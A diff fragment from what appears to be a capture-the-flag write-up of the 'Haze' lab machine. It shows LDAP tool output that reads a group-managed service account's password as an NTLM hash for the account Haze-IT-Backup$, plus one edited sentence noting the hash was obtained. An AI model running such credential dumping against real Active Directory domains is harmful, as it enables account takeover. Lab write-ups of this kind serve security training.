@@ -465,4 +465,5 @@ LDAP        10.129.11.223   389    DC01             [+] haze.htb\mark.adams:Ld@p
 LDAP        10.129.11.223   389    DC01             [*] Getting GMSA Passwords
 LDAP        10.129.11.223   389    DC01             Account: Haze-IT-Backup$      NTLM: 76da32697ff38bc7c9fa6289abf47940     PrincipalsAllowedToReadPassword: mark.adams
 ```
-Now i have the NTLM of the s
+Now i have the NTLM of the service account
+
